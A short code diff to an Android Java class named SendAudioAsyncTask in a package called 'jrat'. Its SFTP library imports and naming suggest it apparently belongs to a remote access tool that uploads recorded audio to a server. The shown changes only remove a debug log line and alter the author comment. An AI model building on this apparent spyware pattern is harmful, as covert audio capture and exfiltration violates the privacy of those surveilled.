@@ -2,7 +2,6 @@ package com.julioxus.jrat;
 
 import android.content.Context;
 import android.os.AsyncTask;
-import android.util.Log;
 
 import com.jcraft.jsch.Channel;
 import com.jcraft.jsch.ChannelSftp;
@@ -13,7 +12,7 @@ import java.io.File;
 import java.util.Properties;
 
 /**
- * Created by julioxus on 13/03/16.
+ * Created by enpi on 03/06/2016.
  */
 public class SendAudioAsyncTask extends AsyncTask<Context, Void, String> {
 
@@ -25,8 +24,6 @@ public class SendAudioAsyncTask extends AsyncTask<Context, Void, String> {
         this.context = context;
         this.fileName = fileName;
         this.android_id = android_id;
-
-        Log.d("Path fichero", fileName);
     }
 
     @Override
